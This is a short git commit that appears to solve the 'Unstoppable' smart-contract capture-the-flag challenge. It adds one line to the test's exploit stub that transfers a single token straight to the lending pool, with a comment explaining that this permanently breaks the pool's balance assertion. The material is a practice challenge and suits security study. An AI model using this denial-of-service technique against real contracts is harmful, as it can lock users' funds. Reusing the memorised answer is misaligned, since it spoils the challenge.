9046428b88d8eaadbf5ea2d628a0d9496e7a5853
e.zhydzetski <e.zhydzetski@gmail.com>
2022-06-24 13:29:26 +0300

    1 done

--- test/unstoppable/unstoppable.challenge.js
+++ test/unstoppable/unstoppable.challenge.js
@@ -40,6 +40,9 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        await this.token.connect(attacker).transfer(this.pool.address, 1);
+        // deposit tokens to pool out of `depositTokens` function cause to permanent error on assert(poolBalance == balanceBefore);
     });
 
     after(async function () {
